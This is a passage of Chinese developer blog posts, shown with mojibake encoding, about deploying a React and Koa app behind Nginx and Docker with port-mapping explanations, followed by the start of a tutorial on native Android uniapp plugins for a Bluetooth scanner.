<h3 data-id="heading-11">éœ€è¦ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ç›®å½•æ–‡ä»¶å¦‚ä¸‹ï¼š</h3>
<pre><code class="hljs language-csharp" lang="csharp">server
build <span class="hljs-meta">#ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¹‹åæ”¹ä¸ªåå­—ï¼Œå¦‚ï¼štranslationfront</span>
package-<span class="hljs-keyword">lock</span>.json
package.json
Dockerfile.backend
docker-compose.yml
</code></pre>
<p>æœåŠ¡å™¨ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-lua" lang="lua">UbuntuæœåŠ¡å™¨
â”œâ”€ /opt
    |<span class="hljs-comment">---ec-translation</span>
                |
            translationfront â† React build
                |
            server
                |
            Dockerfile.backend
               |
            docker-compose.yml
               |
            <span class="hljs-built_in">package</span>.json
               |
            <span class="hljs-built_in">package</span>-lock.json
</code></pre>
<h3 data-id="heading-12">nginxé…ç½®</h3>
<pre><code class="hljs language-ini" lang="ini">server{
    listen 9527<span class="hljs-comment">;</span>
    server_name oa.jt-ele.com<span class="hljs-comment">;</span>
    absolute_redirect off<span class="hljs-comment">;</span>
    access_log /var/log/nginx/oa.jt-ele.com-port-9527.access.log<span class="hljs-comment">;</span>
    error_log  /var/log/nginx/oa.jt-ele.com-port-9527.error.log<span class="hljs-comment">;</span>
  
    <span class="hljs-comment">#aiç¿»è¯‘åº”ç”¨å‰ç«¯</span>
    location /translationfront {
        root /opt/ec-translation<span class="hljs-comment">;</span>
        index index.html<span class="hljs-comment">;</span>
        try_files $uri $uri/ /translationfront/index.html<span class="hljs-comment">;</span>
    }
    
      <span class="hljs-comment">#aiç¿»è¯‘åº”ç”¨apiæœåŠ¡:ä»£ç†åˆ° Dockerä¸­çš„ Koa æœåŠ¡</span>
    location /ecTranslationApi/ {
        proxy_pass http://127.0.0.1:6050<span class="hljs-comment">;</span>
        proxy_set_header Host $host<span class="hljs-comment">;</span>
        proxy_set_header X-Real-IP $remote_addr<span class="hljs-comment">;</span>
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for<span class="hljs-comment">;</span>
        proxy_set_header X-Forwarded-Proto $scheme<span class="hljs-comment">;</span>
        proxy_http_version 1.1<span class="hljs-comment">;</span>
    }
    
}
</code></pre>
<h4 data-id="heading-13">è·¯å¾„æ˜ å°„åŸç†ï¼š</h4>
<ol>
<li>root:</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"> location /translationfront {
    root /opt/ec-translation;
    index index.html;
    try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /translationfront/index.html;
 }
</code></pre>
<h4 data-id="heading-14">ğŸ” <code>root</code>Â æŒ‡ä»¤çš„è·¯å¾„æ‹¼æ¥è§„åˆ™</h4>
<h5 data-id="heading-15">ğŸ“Œ Nginx çš„Â <code>root</code>Â æ˜¯è¿™æ ·å·¥ä½œçš„ï¼š</h5>
<blockquote>
<p><strong><code>root</code> æŒ‡å®šçš„æ˜¯â€œæ ¹ç›®å½•â€ï¼Œæœ€ç»ˆæ–‡ä»¶è·¯å¾„ = <code>root è·¯å¾„ + å®Œæ•´çš„ URI</code></strong></p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<ul>
<li><code>root /opt/ec-translation;</code></li>
<li>è¯·æ±‚Â <code>/translationfront</code></li>
<li>Nginx å®é™…æŸ¥æ‰¾çš„æ–‡ä»¶æ˜¯ï¼š<code>/opt/ec-translation/translationfront</code></li>
</ul>
<ol start="2">
<li>alias</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"> location /translationfront {
    <span class="hljs-built_in">alias</span> /opt/ec-translation/translationfront;
    index index.html;
    try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /translationfront/index.html;
 }
</code></pre>
<h5 data-id="heading-16">ğŸ”Â <code>alias</code>Â çš„è§„åˆ™æ˜¯ï¼š</h5>
<blockquote>
<p><code>alias</code> ä¼š <strong>æ›¿æ¢ location åŒ¹é…çš„éƒ¨åˆ†</strong></p>
</blockquote>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li><code>location /translationfront</code></li>
<li><code>alias /opt/ec-translation/translationfront</code></li>
<li>è¯·æ±‚Â <code>/translationfront</code>Â â†’ å®é™…è·¯å¾„ï¼š<code>/opt/ec-translation/translationfront</code></li>
</ul>
<p>å®Œç¾åŒ¹é…ä½ çš„æ–‡ä»¶ç»“æ„</p>
<h4 data-id="heading-17">ç«¯å£æ˜ å°„åŸç†ï¼šä¸ºä»€ä¹ˆæ²¡åšç«¯å£æ˜ å°„ï¼Œä¹Ÿèƒ½è®¿é—®åç«¯apiï¼Ÿ</h4>
<p>ä¸€å¥è¯ï¼šNginxåœ¨å…¬ç½‘ç«¯å£ä¸Š"æ›¿ä½ è½¬å‘äº†è¯·æ±‚"</p>
<h2 data-id="heading-18">ä¸€å¼ å›¾å…ˆçœ‹å…¨å±€ï¼ˆéå¸¸é‡è¦ï¼‰</h2>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-attr">[ æµè§ˆå™¨ ]</span>
    |
    |  <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//oa.jt-ele.com:9527/ecTranslationApi/translateText</span>
    |
<span class="hljs-selector-attr">[ å…¬ç½‘ IP : 9527 ]</span>   â†â€”â€”â€” åªæœ‰è¿™ä¸ªç«¯å£æ˜¯å…¬ç½‘å¼€æ”¾çš„
    |
<span class="hljs-selector-attr">[ Nginxï¼ˆå®¿ä¸»æœºï¼‰ ]</span>
    |
    |  <span class="hljs-selector-tag">proxy_pass</span> <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//127.0.0.1:6050</span>
    |
<span class="hljs-selector-attr">[ å®¿ä¸»æœº 127.0.0.1:6050 ]</span>
    |
<span class="hljs-selector-attr">[ Docker ç«¯å£æ˜ å°„ ]</span>
    |
<span class="hljs-selector-attr">[ å®¹å™¨å†… Koa :6050 ]</span>
</code></pre>
<p>ğŸ‘‰ <strong>å¤–ç½‘åªèƒ½çœ‹åˆ° 9527</strong><br/>
ğŸ‘‰ <strong>6050 ä»æ¥æ²¡æš´éœ²ç»™å…¬ç½‘</strong></p>
<h2 data-id="heading-19">ä¸‰ä¸ªç«¯å£ï¼Œå„è‡ªâ€œèº«ä»½â€æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<blockquote>
<p>å®¿ä¸»æœºç«¯å£ã€å®¹å™¨ç«¯å£ã€æœ¬åœ°é¡¹ç›®ç«¯å£ï¼Œè¿™äº›æ˜¯æ€ä¹ˆæ˜ å°„çš„ï¼Ÿ</p>
</blockquote>
<p>æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªå¯¹ã€‚</p>
<hr/>
<h3 data-id="heading-20">æœ¬åœ°é¡¹ç›®ç«¯å£ï¼ˆKoa listen çš„ç«¯å£ï¼‰</h3>
<pre><code class="hljs language-ini" lang="ini">app.listen(6050)<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ˜¯ï¼š</p>
<blockquote>
<p>âœ… <strong>Koa åœ¨â€œå®¹å™¨å†…éƒ¨â€ç›‘å¬çš„ç«¯å£</strong></p>
</blockquote>
<p>âš ï¸ å®ƒçš„ä½œç”¨èŒƒå›´ï¼š</p>
<ul>
<li>âŒ å¤–ç½‘è®¿é—®ä¸åˆ°</li>
<li>âŒ å®¿ä¸»æœºä¹Ÿè®¿é—®ä¸åˆ°</li>
<li>âœ… <strong>åªåœ¨å®¹å™¨å†…éƒ¨æœ‰æ•ˆ</strong></li>
</ul>
<hr/>
<h3 data-id="heading-21">å®¹å™¨ç«¯å£ï¼ˆDocker EXPOSEï¼‰</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">EXPOSE</span> <span class="hljs-number">6050</span>
</code></pre>
<p>è¿™ä¸€æ­¥ï¼š</p>
<blockquote>
<p>â— <strong>åªæ˜¯â€œå£°æ˜â€</strong></p>
<p>ğŸ‘‰ å‘Šè¯‰ Dockerï¼šè¿™ä¸ªå®¹å™¨â€œæ‰“ç®—ç”¨â€6050</p>
</blockquote>
<p>âš ï¸ å®ƒä¸ä¼šï¼š</p>
<ul>
<li>âŒ è‡ªåŠ¨æš´éœ²ç«¯å£</li>
<li>âŒ è‡ªåŠ¨å¯¹å¤–å¼€æ”¾</li>
</ul>
<p>å¾ˆå¤šäººè¯¯ä»¥ä¸º <code>EXPOSE</code> å°±æ˜¯â€œå¼€å…¬ç½‘â€ï¼Œè¿™æ˜¯<strong>è¯¯åŒº</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-22">å®¿ä¸»æœºç«¯å£ï¼ˆdocker-compose çš„ portsï¼‰</h3>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ports:</span>
  - <span class="hljs-string">"6050:6050"</span>
</code></pre>
<p>è¿™ä¸€æ­¥æ‰æ˜¯çœŸæ­£çš„ã€Œé€šé“å»ºç«‹ã€ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">å®¿ä¸»æœº</span> <span class="hljs-number">6050</span>  <span class="hljs-string">â†â†’</span>  <span class="hljs-string">å®¹å™¨</span> <span class="hljs-number">6050</span>
</code></pre>
<p>ğŸ‘‰ ä½†æ³¨æ„ï¼š</p>
<ul>
<li><strong>è¿™æ˜¯å®¿ä¸»æœºç«¯å£</strong></li>
<li>å¹¶ä¸ç­‰äºå…¬ç½‘ç«¯å£</li>
</ul>
<p>æ˜¯å¦å…¬ç½‘å¯è®¿é—®ï¼Œå–å†³äº <strong>é˜²ç«å¢™ / äº‘å‚å•† / Nginx</strong></p>
<hr/>
<h2 data-id="heading-23">ä¸ºä»€ä¹ˆâ€œæ²¡å¼€å…¬ç½‘ç«¯å£ï¼Œä¹Ÿèƒ½å…¬ç½‘è®¿é—®â€ï¼Ÿ</h2>
<h4 data-id="heading-24">ç­”æ¡ˆåªæœ‰ä¸€å¥è¯ï¼š</h4>
<blockquote>
<p><strong>å› ä¸º Nginx å¸®ä½ åšäº†â€œä¸­è½¬â€</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-25">ä½ ç°åœ¨çš„çœŸå®æƒ…å†µï¼ˆä»£å…¥ä½ çš„é…ç½®ï¼‰</h3>
<h4 data-id="heading-26">1ï¸âƒ£ å…¬ç½‘åªå¼€æ”¾äº†ä¸€ä¸ªç«¯å£</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">å…¬ç½‘</span> <span class="hljs-attr">IP :</span> <span class="hljs-number">9527</span>   <span class="hljs-string">âœ…</span>
</code></pre>
<p>äº‘æœåŠ¡å™¨å®‰å…¨ç»„ / ç©¿é€ / é˜²ç«å¢™åªæ”¾è¡Œäº†ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">9527</span>
</code></pre>
<hr/>
<h4 data-id="heading-27">2ï¸âƒ£ Nginx ç›‘å¬è¿™ä¸ªå…¬ç½‘ç«¯å£</h4>
<pre><code class="hljs language-arduino" lang="arduino">server {
    listen <span class="hljs-number">9527</span>;

    location /ecTranslationApi/ {
        proxy_pass http:<span class="hljs-comment">//127.0.0.1:6050/;</span>
    }
}
</code></pre>
<p>ğŸ‘‰ Nginx æ˜¯è·‘åœ¨ <strong>å®¿ä¸»æœºä¸Šçš„</strong></p>
<hr/>
<h4 data-id="heading-28">3ï¸âƒ£ è¯·æ±‚â€œè¢«è½¬å‘â€åˆ°äº†æœ¬åœ° 6050</h4>
<pre><code class="hljs">Nginx â†’ 127.0.0.1:6050
</code></pre>
<p>è¿™é‡Œçš„ <code>127.0.0.1</code> æ˜¯ï¼š</p>
<blockquote>
<p><strong>å®¿ä¸»æœºè‡ªå·±</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-29">4ï¸âƒ£ Docker å†æŠŠè¯·æ±‚é€è¿›å®¹å™¨</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">å®¿ä¸»æœº</span> <span class="hljs-number">6050</span> <span class="hljs-string">â†’</span> <span class="hljs-string">å®¹å™¨</span> <span class="hljs-number">6050</span> <span class="hljs-string">â†’</span> <span class="hljs-string">Koa</span>
</code></pre>
<hr/>
<h2 data-id="heading-30">æ‰€ä»¥â€œå…¬ç½‘è®¿é—®åç«¯â€çš„çœŸç›¸æ˜¯</h2>
<blockquote>
<p><strong>å…¬ç½‘è®¿é—®çš„æ ¹æœ¬ä¸æ˜¯ Koa</strong></p>
<p><strong>å…¬ç½‘è®¿é—®çš„æ˜¯ Nginx</strong></p>
<p>Koa æ°¸è¿œèº²åœ¨å†…ç½‘é‡Œ</p>
</blockquote>
<p>è¿™å°±æ˜¯<strong>æ ‡å‡†ç”Ÿäº§æ¶æ„</strong></p>
<hr/>
<h2 data-id="heading-31">ä¸ºä»€ä¹ˆè¿™ç§æ¶æ„æ˜¯â€œæœ€å®‰å…¨ã€æœ€æ¨èçš„â€ï¼Ÿ</h2>
<p>å¯¹æ¯”ä¸€ä¸‹ ğŸ‘‡</p>
<h4 data-id="heading-32">âŒ é”™è¯¯/å±é™©åšæ³•</h4>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ports:</span>
  - <span class="hljs-string">"6050:6050"</span>
</code></pre>
<p>å¹¶ä¸”ï¼š</p>
<ul>
<li>äº‘é˜²ç«å¢™ç›´æ¥æ”¾è¡Œ 6050</li>
</ul>
<p>åæœï¼š</p>
<ul>
<li>å¤–ç½‘å¯ä»¥ç›´æ¥æ‰“ä½  Koa</li>
<li>æ²¡é™æµ</li>
<li>æ²¡æ—¥å¿—</li>
<li>æ²¡é‰´æƒ</li>
<li>ææ˜“è¢«æ‰«ç«¯å£</li>
</ul>
<hr/>
<h4 data-id="heading-33">âœ… ä½ ç°åœ¨çš„åšæ³•ï¼ˆæ­£ç¡®ï¼‰</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">å…¬ç½‘ï¼šåªå¼€</span> <span class="hljs-number">9527</span>
<span class="hljs-string">Nginxï¼šç»Ÿä¸€å…¥å£</span>
<span class="hljs-string">åç«¯ï¼šå†…ç½‘æœåŠ¡</span>
</code></pre>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li>âœ… æ‰€æœ‰æ¥å£éƒ½èƒ½ç»Ÿä¸€åŠ é‰´æƒ / æ—¥å¿— / é™æµ</li>
<li>âœ… åç«¯ç«¯å£æ°¸ä¸æš´éœ²</li>
<li>âœ… å¯ä»¥éšæ„æ”¹åç«¯ç«¯å£ï¼Œä¸å½±å“å‰ç«¯</li>
<li>âœ… å¯ä»¥æŒ‚å¤šä¸ªåç«¯æœåŠ¡</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®‰å“åŸç”Ÿå†™uniappæ’ä»¶æ‰‹æŠŠæ‰‹æ•™å­¦è°ƒè¯•ã€æ‰“åŒ…ã€å‘å¸ƒã€‚]]></title>    <link>https://juejin.cn/post/7589207843787604003</link>    <guid>https://juejin.cn/post/7589207843787604003</guid>    <pubDate>2025-12-30T02:32:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207843787604003" data-draft-id="7555405789659103284" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®‰å“åŸç”Ÿå†™uniappæ’ä»¶æ‰‹æŠŠæ‰‹æ•™å­¦è°ƒè¯•ã€æ‰“åŒ…ã€å‘å¸ƒã€‚"/> <meta itemprop="keywords" content="å‰ç«¯,uni-app"/> <meta itemprop="datePublished" content="2025-12-30T02:32:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ResponseState200"/> <meta itemprop="url" content="https://juejin.cn/user/2436173497121597"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®‰å“åŸç”Ÿå†™uniappæ’ä»¶æ‰‹æŠŠæ‰‹æ•™å­¦è°ƒè¯•ã€æ‰“åŒ…ã€å‘å¸ƒã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173497121597/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ResponseState200
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:32:26.000Z" title="Tue Dec 30 2025 02:32:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"â‡²"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"â€¢";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å¤§å®¶å¥½å‘€ï¼Œä½œä¸ºä¸€ä¸ªå‰ç«¯å·¥ç¨‹å¸ˆï¼Œå¯¹äºä½¿ç”¨uniappæ¥å†™appå¤§å®¶åº”è¯¥å¹¶ä¸é™Œç”Ÿï¼Œä½†æ˜¯å¯¹äºå°è£…ç¬¬ä¸‰æ–¹æä¾›çš„<strong>å®‰å“åŸç”Ÿsdkç»™åˆ°uniapp</strong>å½“ä¸­å»ä½¿ç”¨ï¼Œå¹¶æ²¡æœ‰åšè¿‡ï¼Œå‰æ®µæ—¶é—´åˆšå¥½æœ‰è¿™ä¹ˆéœ€æ±‚ï¼Œåšäº†ä¸€ä¸ªuniappé“¾æ¥è“ç‰™è®¾å¤‡ï¼Œå¹¶ä¸”è°ƒç”¨å®‰å“åŸç”Ÿsdkçš„èƒ½åŠ›çš„è¿™ä¹ˆä¸€ä¸ªéœ€æ±‚ï¼Œæƒ³ç€å†™ä¸€ä¸ªç¬”è®°ï¼Œéƒ½ä¸æ•¢å«åšæ•™ç¨‹çš„ä¸€ä¸ªæ–‡ç« ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜å¸Œæœ›å¤§å®¶å¯ä»¥æŒ‡æ•™ã€‚</p>
<hr/>
<h2 data-id="heading-1">å‰æœŸå‡†å¤‡</h2>
<ol>
<li>javaçš„sdkï¼Œç”±äºæ˜¯æ¶‰åŠåˆ°å®‰å“çš„åŸç”Ÿå¼€å‘ï¼Œæ‰€ä»¥è¿™ä¸ªæ˜¯å®‰å“çš„å¼€å‘ç¯å¢ƒè¿˜æ˜¯è¦æ­å»ºçš„ï¼Œæ•™ç¨‹ä¸€æœä¸€å¤§æŠŠï¼Œæˆ‘å°±ä¸èµ˜è¿°äº†</li>
<li>Android studioï¼Œå®‰å“åŸç”Ÿçš„IDEç¼–ç å·¥å…·</li>
<li>ä¸‹è½½uniappå®˜ç½‘ä¸­çš„ç¤ºä¾‹åŒ…ï¼Œåæ¥ç”¨äºè°ƒè¯•åŸç”Ÿå®‰å“ä»£ç æ—¶éœ€è¦ç”¨çš„åˆ°ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fnativesupport.dcloud.net.cn%2FNativePlugin%2Fcourse%2Fandroid.html" target="_blank" title="https://nativesupport.dcloud.net.cn/NativePlugin/course/android.html" ref="nofollow noopener noreferrer">nativesupport.dcloud.net.cn/NativePlugiâ€¦</a></li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bbd447b19dc46fe86b2371985935845~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=PPbJjbKmcfEN1lW6eFwdjTnUE6I%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">å®˜æ–¹ç¤ºä¾‹</h2>
<p>å‰æœŸå‡†å¤‡åšå¥½ï¼Œæˆ‘ä»¬ä½¿ç”¨android_studioæ‰“å¼€<strong>UniPlugin-Hello-AS</strong>è¿™ä¸ªé¡¹ç›®ï¼Œç­‰å¾…ä¾èµ–åŒ…å®‰è£…å®Œæˆã€‚</p>
<blockquote>
<p>å®‰è£…ä¾èµ–åŒ…ä¼šæ¯”è¾ƒæ…¢ï¼Œå»ºè®®ä½¿ç”¨ç§‘å­¦ä¸Šç½‘ï¼Œç„¶ååœ¨Android-studioä¸Šè®¾ç½®ä¸€ä¸‹ä»£ç†ï¼Œé€Ÿåº¦ä¼šå¿«å¾ˆå¤š</p>
</blockquote>
<h3 data-id="heading-3">è®¾ç½®ä»£ç†</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd138df9b9a24031b801f3cfd159a29f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=6qutAWX9NY%2BAYAnPXtb%2BHB4SsTo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">å®˜æ–¹ç¤ºä¾‹ä»£ç ç»“æ„</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e80322f06794585b80195bca460b3c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUmVzcG9uc2VTdGF0ZTIwMA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666746&amp;x-signature=vxl%2FtADHxlCS3UqiNmHt%2B2XsmkE%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">è“ç‰™æ‰«ææ’ä»¶</h2>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦åšä¸€ä¸ªè“ç‰™æ‰«æå™¨çš„æ’ä»¶ï¼Œæä¾›ç»™uniappçš„é¡¹ç›®ä½¿ç”¨ã€‚åˆ†æä¸€ä¸‹éœ€æ±‚</p>
<ol>
<li>åŠŸèƒ½åŒ…æ‹¬ï¼Œè¿æ¥è“ç‰™æ‰«æå™¨ã€å¼€å§‹æ‰«æã€è·å–æ‰«æåˆ°çš„æ•°æ®ã€åœæ­¢æ‰«æã€‚</li>
<li>ç»¼ä¸Šæ‰€è¿°çš„åŠŸèƒ½è¦æ±‚ï¼Œæˆ‘ä»¬ä¸éœ€è¦å®‰å“åŸç”Ÿè¿™è¾¹å†™ç•Œé¢ï¼Œåªéœ€è¦æä¾›è°ƒç”¨sdkçš„èƒ½åŠ›ã€‚æ‰€ä»¥æˆ‘ä»¬å‚è€ƒå®˜æ–¹çš„<strong>uniplugin_module</strong>è¿™ä¸ªæ’ä»¶</li>
</ol>
<h3 data-id="heading-6">æ–°å»ºä¸€ä¸ªè“ç‰™æ‰«æå™¨çš„å®‰å“åŸç”Ÿæ¨¡å—</h3>
